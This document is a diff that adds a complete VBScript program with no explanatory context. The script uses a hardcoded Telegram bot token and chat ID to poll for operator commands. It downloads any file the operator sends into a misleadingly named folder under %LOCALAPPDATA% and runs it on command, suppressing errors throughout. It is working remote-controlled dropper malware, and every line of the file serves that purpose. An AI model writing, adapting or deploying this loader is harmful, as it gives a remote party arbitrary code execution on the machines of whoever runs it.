@@ -1,0 +1,128 @@
+Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
+Set objHTTP2 = CreateObject("WinHttp.WinHttpRequest.5.1")
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("WScript.Shell")
+
+token = "8403887741:AAEMX2CQ_EXbs80_QY8SlQySy_kg9tpXRw4"
+chatId = "8538026219"
+baseDir = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\error14\"
+
+lastUpdate = 0
+waitingForFile = False
+waitingForAction = False
+tempFileId = ""
+tempFileName = ""
+
+Sub SendMsg(txt)
+    On Error Resume Next
+    Dim i, c, encoded, code
+    encoded = ""
+    For i = 1 To Len(txt)
+        c = Mid(txt, i, 1)
+        code = Asc(c)
+        If (code >= 48 And code <= 57) Or (code >= 65 And code <= 90) Or (code >= 97 And code <= 122) Then
+            encoded = encoded & c
+        ElseIf c = " " Then encoded = encoded & "%20"
+        ElseIf c = Chr(10) Then encoded = encoded & "%0A"
+        Else encoded = encoded & "%" & Right("0" & Hex(code), 2)
+        End If
+    Next
+    url = "https://api.telegram.org/bot" & token & "/sendMessage?chat_id=" & chatId & "&text=" & encoded
+    objHTTP.Open "GET", url, False
+    objHTTP.Send
+End Sub
+
+Function ExtractValue(json, key)
+    Dim pos : pos = InStr(json, Chr(34) & key & Chr(34) & ":")
+    If pos = 0 Then Exit Function
+    pos = pos + Len(key) + 3
+    If Mid(json, pos, 1) = Chr(34) Then
+        pos = pos + 1
+        Dim i, res : res = ""
+        For i = pos To Len(json)
+            If Mid(json, i, 1) = Chr(34) Then Exit For
+            res = res & Mid(json, i, 1)
+        Next
+        ExtractValue = res
+    End If
+End Function
+
+Sub SaveAndExecute(fileId, fileName, shouldOpen)
+    On Error Resume Next
+    Dim infoUrl, filePath, fileUrl, savePath
+    infoUrl = "https://api.telegram.org/bot" & token & "/getFile?file_id=" & fileId
+    objHTTP2.Open "GET", infoUrl, False
+    objHTTP2.Send
+    filePath = ExtractValue(objHTTP2.ResponseText, "file_path")
+    fileUrl = "https://api.telegram.org/file/bot" & token & "/" & filePath
+    savePath = baseDir & fileName
+    Dim objStream : Set objStream = CreateObject("ADODB.Stream")
+    objStream.Open : objStream.Type = 1
+    objHTTP2.Open "GET", fileUrl, False
+    objHTTP2.Send
+    objStream.Write objHTTP2.ResponseBody
+    objStream.SaveToFile savePath, 2
+    objStream.Close
+    If shouldOpen Then
+        SendMsg "Done! File saved and OPENED: " & fileName
+        objShell.Run Chr(34) & savePath & Chr(34)
+    Else
+        SendMsg "Done! File just ADDED to folder: " & fileName
+    End If
+End Sub
+
+If Not fso.FolderExists(baseDir) Then fso.CreateFolder baseDir
+
+SendMsg "Bot is ONLINE. Send /download to start."
+
+Do
+    On Error Resume Next
+    updateUrl = "https://api.telegram.org/bot" & token & "/getUpdates?offset=" & (lastUpdate + 1) & "&timeout=30"
+    objHTTP.Open "GET", updateUrl, False
+    objHTTP.Send
+    res = objHTTP.ResponseText
+    posUpd = InStr(res, "update_id")
+    If posUpd > 0 Then
+        posVal = posUpd + 11
+        valStr = ""
+        Do While Mid(res, posVal, 1) <> "," And Mid(res, posVal, 1) <> "}"
+            valStr = valStr & Mid(res, posVal, 1)
+            posVal = posVal + 1
+        Loop
+        newUpdateId = CLng(valStr)
+        If newUpdateId > lastUpdate Then
+            Dim rawText : rawText = LCase(ExtractValue(res, "text"))
+            Dim hasDoc : hasDoc = InStr(res, Chr(34) & "document" & Chr(34)) > 0
+            Dim hasPhoto : hasPhoto = InStr(res, Chr(34) & "photo" & Chr(34)) > 0
+            If waitingForAction Then
+                If rawText = "open" Then
+                    SaveAndExecute tempFileId, tempFileName, True
+                    waitingForAction = False
+                ElseIf rawText = "add" Then
+                    SaveAndExecute tempFileId, tempFileName, False
+                    waitingForAction = False
+                Else
+                    SendMsg "Invalid command. Please type 'open' or 'add'."
+                End If
+            ElseIf waitingForFile And (hasDoc Or hasPhoto) Then
+                waitingForFile = False
+                If hasDoc Then
+                    posDoc = InStr(res, Chr(34) & "document" & Chr(34))
+                    tempFileId = ExtractValue(Mid(res, posDoc), "file_id")
+                    tempFileName = ExtractValue(Mid(res, posDoc), "file_name")
+                Else
+                    posPh = InStrRev(res, Chr(34) & "file_id" & Chr(34))
+                    tempFileId = ExtractValue(Mid(res, posPh), "file_id")
+                    tempFileName = "img_" & Left(tempFileId, 5) & ".jpg"
+                End If
+                waitingForAction = True
+                SendMsg "File received! Now type 'open' to run it or 'add' to just save it."
+            ElseIf rawText = "/download" Then
+                waitingForFile = True
+                SendMsg "Please send the file you want to process."
+            End If
+            lastUpdate = newUpdateId
+        End If
+    End If
+    WScript.Sleep 1500
+Loop
